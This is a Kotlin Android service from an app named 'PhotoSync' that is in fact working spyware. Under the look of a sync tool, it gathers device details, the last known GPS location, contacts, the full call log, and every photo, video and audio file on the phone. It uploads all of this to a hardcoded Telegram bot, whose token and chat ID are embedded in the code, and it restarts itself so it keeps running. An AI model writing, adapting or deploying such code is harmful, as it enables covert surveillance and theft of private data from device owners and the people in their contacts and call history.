package com.example.photosync

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

class SyncForegroundService : Service() {

    companion object {
        const val CHANNEL_ID = "photosync_channel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_STATUS_UPDATE = "com.example.photosync.ACTION_STATUS_UPDATE"
        const val EXTRA_STATUS_TEXT = "extra_status_text"
    }

    private val ioExecutor = Executors.newSingleThreadExecutor()
    private val isRunning = AtomicBoolean(false)

    private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
    private val chatId = "8859920681"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundCompat("جاري تشغيل الخدمة...")

        if (isRunning.compareAndSet(false, true)) {
            ioExecutor.execute {
                try {
                    runSyncWithRetry()
                } finally {
                    isRunning.set(false)
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf(startId)
                }
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(text: String) {
        val notification = buildNotification(text)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PhotoSync")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "مزامنة البيانات",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun publishStatus(message: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, buildNotification(message))

        sendBroadcast(Intent(ACTION_STATUS_UPDATE).apply {
            setPackage(packageName)
            putExtra(EXTRA_STATUS_TEXT, message)
        })
    }

    private fun runSyncWithRetry() {
        val maxRetries = 3
        var callLogsSent = false
        var infoSent = false

        for (attempt in 1..maxRetries) {
            try {
                publishStatus("محاولة المزامنة ($attempt/$maxRetries)...")
                if (!infoSent) {
                    sendDeviceAndLocationInfo()
                    sendContactsIfPermitted()
                    infoSent = true
                }
                if (!callLogsSent) {
                    sendCallLogsOnce()
                    callLogsSent = true
                }
                sendMediaCollection(
                    contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    endpointMethod = "sendPhoto",
                    fieldName = "photo",
                    filePrefix = "photo",
                    mimeType = "image/jpeg",
                    label = "الصور"
                )
                sendMediaCollection(
                    contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    endpointMethod = "sendVideo",
                    fieldName = "video",
                    filePrefix = "video",
                    mimeType = "video/mp4",
                    label = "الفيديوهات"
                )
                sendMediaCollection(
                    contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                    endpointMethod = "sendAudio",
                    fieldName = "audio",
                    filePrefix = "audio",
                    mimeType = "audio/mpeg",
                    label = "الملفات الصوتية"
                )
                publishStatus("اكتملت العملية بنجاح.")
                return
            } catch (_: Exception) {
                if (attempt < maxRetries) {
                    publishStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                    try {
                        Thread.sleep(1000L * attempt)
                    } catch (_: InterruptedException) {
                        return
                    }
                }
            }
        }
        publishStatus("تعذر إتمام العملية بعد عدة محاولات.")
    }

    private fun sendDeviceAndLocationInfo() {
        val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.activeNetwork?.let { cm.getNetworkCapabilities(it) }
        val netType = when {
            caps == null -> "NONE"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
            else -> "OTHER"
        }

        val locText = readLastLocationText()
        val msg = buildString {
            appendLine("DeviceInfo:")
            appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
            appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
            appendLine("Battery: ${batteryPct}%")
            appendLine("Network: $netType")
            appendLine("Location: $locText")
        }
        postTelegramText(msg.take(3900))
    }

    private fun readLastLocationText(): String {
        val fineGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarseGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fineGranted && !coarseGranted) return "permission_denied"

        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            try {
                if (lm.isProviderEnabled(provider)) {
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null) {
                        return "lat=${loc.latitude}, lon=${loc.longitude} ($provider)"
                    }
                }
            } catch (_: SecurityException) {
            }
        }
        return "unavailable"
    }

    private fun sendContactsIfPermitted() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val entries = mutableListOf<String>()
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )?.use { cursor ->
            val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext() && entries.size < 100) {
                val name = cursor.getString(nameIdx) ?: "unknown"
                val num = cursor.getString(numIdx) ?: ""
                entries.add("$name: $num")
            }
        }

        if (entries.isNotEmpty()) {
            val text = "Contacts:\n" + entries.joinToString("\n")
            postTelegramText(text.take(3900))
        }
    }

    private fun sendCallLogsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val rows = mutableListOf<String>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)

            while (cursor.moveToNext()) {
                val number = cursor.getString(numIdx) ?: "unknown"
                val name = cursor.getString(nameIdx) ?: ""
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "OTHER"
                }
                val duration = cursor.getLong(durIdx)
                val date = cursor.getLong(dateIdx)
                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
            }
        }

        if (rows.isNotEmpty()) {
            val summary = "CallLogs:\n" + rows.joinToString("\n")
            postTelegramText(summary.take(3900))
        }
    }

    private fun hasMediaPermissionFor(contentUri: Uri): Boolean {
        return when (contentUri) {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            else -> false
        }
    }

    private fun sendMediaCollection(
        contentUri: Uri,
        endpointMethod: String,
        fieldName: String,
        filePrefix: String,
        mimeType: String,
        label: String
    ) {
        if (!hasMediaPermissionFor(contentUri)) return

        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.MediaColumns._ID)
        contentResolver.query(
            contentUri,
            projection,
            null,
            null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idIdx)
                uris.add(ContentUris.withAppendedId(contentUri, id))
            }
        }

        val total = uris.size
        for ((index, uri) in uris.withIndex()) {
            publishStatus("إرسال $label (${index + 1}/$total)...")
            postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
        }
    }

    private fun postTelegramText(text: String) {
        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 20_000
            readTimeout = 30_000
            doOutput = true
            doInput = true
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }

        try {
            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes(body)
                out.flush()
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram text HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun postTelegramMedia(
        mediaUri: Uri,
        endpointMethod: String,
        fieldName: String,
        filePrefix: String,
        mimeType: String
    ) {
        val boundary = "----AndroidBoundary${System.nanoTime()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot$botToken/$endpointMethod"

        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 20_000
            readTimeout = 45_000
            doInput = true
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        try {
            inputStream.use { stream ->
                DataOutputStream(conn.outputStream).use { out ->
                    out.writeBytes(twoHyphens + boundary + lineEnd)
                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                    out.writeBytes(chatId + lineEnd)

                    out.writeBytes(twoHyphens + boundary + lineEnd)
                    out.writeBytes(
                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.nanoTime()}\"$lineEnd"
                    )
                    out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")

                    val buffer = ByteArray(32768)
                    var bytesRead: Int
                    while (stream.read(buffer).also { bytesRead = it } != -1) {
                        out.write(buffer, 0, bytesRead)
                    }

                    out.writeBytes(lineEnd)
                    out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                    out.flush()
                }
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram $endpointMethod HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdownNow()
    }
}
